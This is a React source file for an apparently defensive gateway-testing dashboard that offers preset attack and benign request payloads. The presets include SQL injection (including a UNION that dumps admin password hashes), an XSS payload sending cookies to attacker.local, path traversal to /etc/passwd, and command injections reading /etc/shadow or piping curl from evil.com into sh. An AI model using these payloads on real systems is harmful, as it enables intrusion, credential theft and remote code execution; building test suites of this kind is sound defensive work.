import React from 'react';
import { Database, Code2, FolderGit2, Terminal, CheckCircle2 } from 'lucide-react';

export const PRESETS = [
  {
    id: 'sqli_tautology',
    label: 'SQLi (Tautology Bypass)',
    category: 'SQL_INJECTION',
    icon: Database,
    color: 'purple',
    payload: {
      email: "admin' OR '1'='1",
      password: "dummy_password",
    },
  },
  {
    id: 'sqli_union',
    label: 'SQLi (UNION Exfiltration)',
    category: 'SQL_INJECTION',
    icon: Database,
    color: 'purple',
    payload: {
      search: "' UNION SELECT username, password_hash, email FROM admin_users --",
    },
  },
  {
    id: 'xss_script',
    label: 'XSS (<script> Exfil)',
    category: 'XSS',
    icon: Code2,
    color: 'cyan',
    payload: {
      comment: "<script>document.location='http://attacker.local/?cookie='+document.cookie</script>",
    },
  },
  {
    id: 'xss_event',
    label: 'XSS (DOM Event Handler)',
    category: 'XSS',
    icon: Code2,
    color: 'cyan',
    payload: {
      avatarUrl: "<img src=x onerror=alert('XSS_PAYLOAD')>",
    },
  },
  {
    id: 'path_traversal',
    label: 'Path Traversal (etc/passwd)',
    category: 'PATH_TRAVERSAL',
    icon: FolderGit2,
    color: 'amber',
    payload: {
      file: "../../../../../../etc/passwd",
    },
  },
  {
    id: 'cmdi_pipe',
    label: 'Command Injection (Pipe)',
    category: 'COMMAND_INJECTION',
    icon: Terminal,
    color: 'rose',
    payload: {
      hostname: "127.0.0.1 ; whoami && cat /etc/shadow",
    },
  },
  {
    id: 'cmdi_subshell',
    label: 'Command Injection (Subshell)',
    category: 'COMMAND_INJECTION',
    icon: Terminal,
    color: 'rose',
    payload: {
      target: "$(curl -s http://evil.com/malware.sh | sh)",
    },
  },
  {
    id: 'benign_search',
    label: 'Benign Search Query',
    category: 'NORMAL',
    icon: CheckCircle2,
    color: 'emerald',
    payload: {
      query: "wireless bluetooth noise-cancelling headphones",
      page: 1,
      sortBy: "price_asc",
    },
  },
  {
    id: 'benign_profile',
    label: 'Benign User Profile',
    category: 'NORMAL',
    icon: CheckCircle2,
    color: 'emerald',
    payload: {
      name: "Dr. Jane Smith",
      title: "Senior Cybersecurity Analyst",
      bio: "Conducting dynamic malware analysis and intrusion detection evaluations.",
    },
  },
];

export default function PayloadPresetSelector({ onSelectPreset, selectedPresetId }) {
  return (
    <div className="bg-[#111827] border border-slate-800 rounded-2xl p-5 shadow-xl">
      <h3 className="font-bold text-white text-sm uppercase tracking-wider mb-1">
        Preset Attack & Normal Catalog
      </h3>
      <p className="text-xs text-slate-400 mb-4">
        Quickly test the SentinelAI gateway against known exploit signatures and clean traffic
      </p>

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
        {PRESETS.map((preset) => {
          const Icon = preset.icon;
          const isSelected = selectedPresetId === preset.id;

          return (
            <button
              key={preset.id}
              onClick={() => onSelectPreset(preset)}
              className={`p-3 rounded-xl border text-left transition flex items-center space-x-3 cursor-pointer ${
                isSelected
                  ? 'bg-blue-600/20 border-blue-500 shadow-lg shadow-blue-500/10'
                  : 'bg-slate-900/60 border-slate-800 hover:border-slate-700 hover:bg-slate-800/40'
              }`}
            >
              <div
                className={`p-2 rounded-lg border border-white/5 ${
                  preset.category === 'SQL_INJECTION'
                    ? 'bg-purple-500/10 text-purple-400'
                    : preset.category === 'XSS'
                    ? 'bg-cyan-500/10 text-cyan-400'
                    : preset.category === 'PATH_TRAVERSAL'
                    ? 'bg-amber-500/10 text-amber-400'
                    : preset.category === 'COMMAND_INJECTION'
                    ? 'bg-rose-500/10 text-rose-400'
                    : 'bg-emerald-500/10 text-emerald-400'
                }`}
              >
                <Icon className="w-4 h-4" />
              </div>
              <div className="min-w-0 flex-1">
                <div className="text-xs font-semibold text-white truncate">{preset.label}</div>
                <div className="text-[10px] font-mono text-slate-400 uppercase tracking-wider">
                  {preset.category}
                </div>
              </div>
            </button>
          );
        })}
      </div>
    </div>
  );
}
